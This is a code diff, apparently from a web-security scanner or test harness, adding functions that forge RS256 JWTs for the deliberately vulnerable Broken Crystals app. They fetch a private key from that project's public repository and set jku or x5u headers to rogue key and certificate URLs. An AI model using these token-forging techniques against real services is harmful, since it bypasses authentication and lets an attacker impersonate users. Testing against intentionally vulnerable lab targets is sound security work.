@@ -520,6 +520,49 @@ export function buildBrokencrystalsX5cRogueJwt(payload: Record<string, unknown>)
   return buildRs256Jwt(payload, pkcs8, { x5c: [pkcs8] });
 }
 
+/** Public rogue JWK set URL shipped with Broken Crystals (JKU_URL in .env). */
+export const BROKEN_CRYSTALS_JKU_ROGUE_URL =
+  "https://raw.githubusercontent.com/NeuraLegion/brokencrystals/stable/config/keys/jku.json";
+/** Public rogue X.509 cert URL shipped with Broken Crystals (X5U_URL in .env). */
+export const BROKEN_CRYSTALS_X5U_ROGUE_URL =
+  "https://raw.githubusercontent.com/NeuraLegion/brokencrystals/stable/config/keys/x509.crt";
+const BROKEN_CRYSTALS_JWK_PRIVATE_PEM_URL =
+  "https://raw.githubusercontent.com/NeuraLegion/brokencrystals/stable/config/keys/jwk.key.pem";
+
+let bcJwkPrivatePemCache: string | null = null;
+
+async function fetchBrokencrystalsJwkPrivatePem(): Promise<string | null> {
+  if (bcJwkPrivatePemCache) return bcJwkPrivatePemCache;
+  try {
+    const res = await fetch(BROKEN_CRYSTALS_JWK_PRIVATE_PEM_URL, {
+      signal: AbortSignal.timeout(15000)
+    });
+    if (!res.ok) return null;
+    bcJwkPrivatePemCache = await res.text();
+    return bcJwkPrivatePemCache;
+  } catch {
+    return null;
+  }
+}
+
+/** Forge a JWT whose jku header points at the public rogue JWK set (Broken Crystals JKU oracle). */
+export async function buildBrokencrystalsJkuRogueJwt(
+  payload: Record<string, unknown>
+): Promise<string | null> {
+  const pem = await fetchBrokencrystalsJwkPrivatePem();
+  if (!pem) return null;
+  return buildRs256Jwt(payload, pem, { jku: BROKEN_CRYSTALS_JKU_ROGUE_URL });
+}
+
+/** Forge a JWT whose x5u header points at the public rogue X.509 cert (Broken Crystals X5U oracle). */
+export async function buildBrokencrystalsX5uRogueJwt(
+  payload: Record<string, unknown>
+): Promise<string | null> {
+  const pem = await fetchBrokencrystalsJwkPrivatePem();
+  if (!pem) return null;
+  return buildRs256Jwt(payload, pem, { x5u: BROKEN_CRYSTALS_X5U_ROGUE_URL });
+}
+
 export function looksAuthChallenge(doc: { status: number; body: string }): boolean {
   if (doc.status === 401 || doc.status === 403) return true;
   return /unauthorized|invalid token|authentication required|not authenticated|access denied/i.test(
